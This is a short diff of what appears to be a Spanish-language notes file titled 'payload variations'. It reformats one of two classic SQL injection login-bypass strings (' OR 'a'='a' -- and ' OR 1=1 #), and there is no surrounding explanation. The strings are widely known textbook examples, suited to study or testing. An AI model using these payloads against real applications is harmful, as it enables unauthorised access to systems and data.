@@ -1,5 +1,5 @@
 🔁 Variaciones del payload
-' OR 'a'='a' --
+- ' OR 'a'='a' --
 
 ' OR 1=1 #
 
